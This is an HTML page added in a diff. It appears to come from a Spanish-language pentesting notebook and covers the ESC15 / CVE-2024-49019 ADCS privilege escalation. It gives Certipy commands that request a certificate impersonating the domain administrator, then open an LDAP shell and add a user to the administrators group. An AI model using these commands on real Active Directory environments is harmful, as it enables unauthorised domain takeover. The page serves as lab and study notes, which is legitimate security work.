@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>ESC15 | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="esc15">
+          <div class="note-tabbar">
+            <span>ESC15</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ADCS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / adcs</p>
+            <h2>ESC15</h2>
+
+            <p>ESC15 recoge abusos recientes de ADCS relacionados con atributos de solicitud y plantillas vulnerables.</p>
+
+            <h2>Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 &quot;EKUwu&quot;)</h2>
+            <p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu">ESC15 PoC</a></p>
+            <section class="code-card">
+              <h3>Solicitar Certificado</h3>
+              <pre><code>certipy-ad req -u &#x27;&lt;attacker&gt;@&lt;domain&gt;&#x27; -p &#x27;&lt;password&gt;&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -target &#x27;&lt;hostname&gt;.&lt;domain&gt;&#x27; -ca &#x27;&lt;ca_name&gt;&#x27; -template &#x27;WebServer&#x27; -upn &#x27;administrator@&lt;domain&gt;&#x27; -sid &lt;SID&gt;  -application-policies &#x27;Client Authentication&#x27;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Autenticarnos Vía LDAP-Shell</h3>
+              <pre><code>certipy-ad auth -pfx &#x27;administrator.pfx&#x27; -dc-ip &#x27;&lt;dc_ip&gt;&#x27; -ldap-shell
+# Error -&gt; KDC_ERR_PADATA_TYPE_NOSUPP: Máquina Authority (acceder a LDAP shell)
+# Agregar a un usuario al grupo administrtors
+add_user_to_group &lt;user&gt; administrators</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=tombwatcher">TombWatcher</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>adcs</span>
+              <span>esc15</span>
+              <span>certipy</span>
+              <span>certificaciones</span>
+              <span>pfx</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
